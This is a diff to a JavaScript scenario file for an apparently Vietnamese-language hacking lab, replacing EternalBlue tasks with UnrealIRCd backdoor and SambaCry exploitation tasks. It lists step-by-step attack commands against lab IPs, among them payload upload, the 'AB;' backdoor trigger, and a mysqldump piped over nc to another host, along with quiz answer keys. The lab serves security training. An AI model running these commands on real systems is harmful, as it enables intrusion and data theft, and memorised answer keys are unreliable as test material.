@@ -4,11 +4,11 @@ window.LabData.SCENARIOS = {
   scan: {
     id: "scan",
     name: "Task 1: Quét mạng (Recon)",
-    description: "Khám phá các host đang hoạt động và dịch vụ SMB trong dải 192.168.202.0/24",
+    description: "Khám phá các host đang hoạt động, cổng 6667 (IRC) và cổng 139,445 (SMB) trong dải 192.168.202.0/24",
     targetNode: "all",
     commands: [
       "nmap -sn 192.168.202.0/24",
-      "nmap -sV -p 139,445 192.168.202.137",
+      "nmap -sV -p 6667 192.168.202.137",
       "nmap -sV -p 139,445 192.168.202.136"
     ],
     question: "Có bao nhiêu host đang hoạt động (Up) trong mạng?",
@@ -19,58 +19,59 @@ window.LabData.SCENARIOS = {
   vuln: {
     id: "vuln",
     name: "Task 2: Phát hiện lỗ hổng",
-    description: "Kiểm tra lỗ hổng MS17-010 (EternalBlue) trên Win7 và Anonymous Share trên Ubuntu",
+    description: "Kiểm tra lỗ hổng UnrealIRCd Backdoor (Port 6667) và SambaCry (CVE-2017-7494)",
     targetNode: "both",
     commands: [
-      "nmap -p445 --script smb-vuln-ms17-010 192.168.202.137",
-      "enum4linux -a 192.168.202.136"
+      "nmap -p 6667 --script irc-unrealircd-backdoor 192.168.202.137",
+      "nmap -p 445 --script smb-vuln-cve-2017-7494 192.168.202.136"
     ],
-    question: "Mã CVE của lỗ hổng SMB trên máy Windows 7 là gì?",
-    placeholder: "VD: CVE-2017-xxxx",
-    answers: ["cve-2017-0143", "cve:cve-2017-0143", "ms17-010"],
-    hint: "Quét script smb-vuln-ms17-010 trên IP .137 và tìm dòng 'IDs: CVE:...'."
+    question: "Mã CVE của lỗ hổng Backdoor trên cổng 6667 là gì?",
+    placeholder: "VD: CVE-2010-xxxx",
+    answers: ["cve-2010-2075", "cve:cve-2010-2075"],
+    hint: "Quét script irc-unrealircd-backdoor trên cổng 6667 của 192.168.202.137."
   },
   smb_ubuntu: {
     id: "smb_ubuntu",
-    name: "Task 3: Khai thác Ubuntu (SMB)",
-    description: "Truy cập trái phép thư mục chia sẻ không mật khẩu và đánh cắp secret.txt",
+    name: "Task 3: Khai thác SambaCry Ubuntu (CVE-2017-7494)",
+    description: "Khai thác RCE dịch vụ Samba trên Ubuntu không dùng Metasploit, upload payload.so và dump cơ sở dữ liệu về Kali2",
     targetNode: "ubuntu",
     commands: [
-      "smbclient -L 192.168.202.136 -N",
-      "smbclient //192.168.202.136/public -N",
-      "ls",
-      "get secret.txt",
+      "nmap -p 139,445 192.168.202.136",
+      "nmap -p 445 --script smb-vuln-cve-2017-7494 192.168.202.136",
+      "smbclient -L //192.168.202.136 -N",
+      "gcc -shared -fPIC -nostartfiles -o payload.so shell.c",
+      'smbclient //192.168.202.136/tmp -N -c "put payload.so"',
+      "python3 exploit.py -t 192.168.202.136 -e /tmp/payload.so",
+      "whoami",
+      'mysql -u root -e "show databases;"',
+      "mysqldump -u root -p'' --all-databases | nc 192.168.202.134 9999",
       "exit"
     ],
-    question: "Nội dung (Flag) bên trong file secret.txt là gì?",
-    placeholder: "Nhập nội dung file secret.txt...",
-    answers: ["day la file bi lo hong smb", "\"day la file bi lo hong smb\""],
-    hint: "Kết nối vào //192.168.202.136/public -N rồi dùng lệnh 'get secret.txt'."
+    question: "Mã CVE của lỗ hổng SambaCry RCE trên dịch vụ Samba là gì?",
+    placeholder: "VD: CVE-2017-xxxx",
+    answers: ["cve-2017-7494", "cve:cve-2017-7494", "sambacry"],
+    hint: "Quét script smb-vuln-cve-2017-7494 trên cổng 445 của 192.168.202.136."
   },
-  msf_win7: {
-    id: "msf_win7",
-    name: "Task 4: Khai thác Win7 (MS17-010)",
-    description: "Chiếm quyền điều khiển SYSTEM trên Windows 7 qua Metasploit EternalBlue",
+  unreal_ircd: {
+    id: "unreal_ircd",
+    name: "Task 4: Khai thác Backdoor UnrealIRCd (Port 6667)",
+    description: "Khai thác Trojan Backdoor trên cổng 6667 không dùng Metasploit, chiếm quyền root và trích xuất dữ liệu MySQL về Kali2",
     targetNode: "win7",
     commands: [
-      "msfconsole",
-      "use exploit/windows/smb/ms17_010_psexec",
-      "set RHOSTS 192.168.202.137",
-      "set LHOST 192.168.202.132",
-      "set PAYLOAD windows/meterpreter/reverse_tcp",
-      "set SMBUser hacker",
-      "set SMBPass 1234",
-      "exploit",
-      "getuid",
-      "sysinfo",
-      "shell",
+      "nmap -sV -p 6667 192.168.202.137",
+      "nmap -p 6667 --script irc-unrealircd-backdoor 192.168.202.137",
+      "nc -nv 192.168.202.137 6667",
+      "AB; id",
+      "python3 exploit_irc.py",
       "whoami",
-      "net user"
+      'mysql -u root -e "show databases;"',
+      "mysqldump -u root -p'' --all-databases | nc 192.168.202.134 9999",
+      "exit"
     ],
-    question: "Quyền (username) chiếm được khi chạy getuid / whoami là gì?",
-    placeholder: "VD: NT AUTHORITY\\SYSTEM",
-    answers: ["nt authority\\system", "system"],
-    hint: "Sau khi exploit mở phiên meterpreter >, chạy lệnh 'getuid' hoặc 'whoami'."
+    question: "Chuỗi trigger (tiền tố) kích hoạt backdoor UnrealIRCd là gì?",
+    placeholder: "VD: AB;",
+    answers: ["ab;", "ab", "cve-2010-2075"],
+    hint: "Gửi chuỗi 'AB; <lệnh>' lên port 6667 để kích hoạt backdoor thực thi quyền root."
   },
   ftp_audit: {
     id: "ftp_audit",
